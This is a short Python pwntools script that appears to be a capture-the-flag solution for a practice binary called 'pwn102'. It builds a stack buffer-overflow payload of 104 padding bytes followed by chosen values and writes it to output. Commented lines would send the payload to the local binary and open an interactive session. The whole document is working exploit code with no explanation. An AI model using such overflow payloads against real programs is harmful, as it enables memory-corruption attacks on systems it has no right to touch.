
from pwn import *
import sys

pad = b'A'*104
pad +=b'\xd3\xc0\x00\x00'
pad +=b'\x33\xff\xc0'
sys.stdout.buffer.write(pad)

#p = process('./pwn102-1644307392479.pwn102')
#p.recvuntil(b'Am I right? ')
#p.sendline(pad)
#p.interactive()
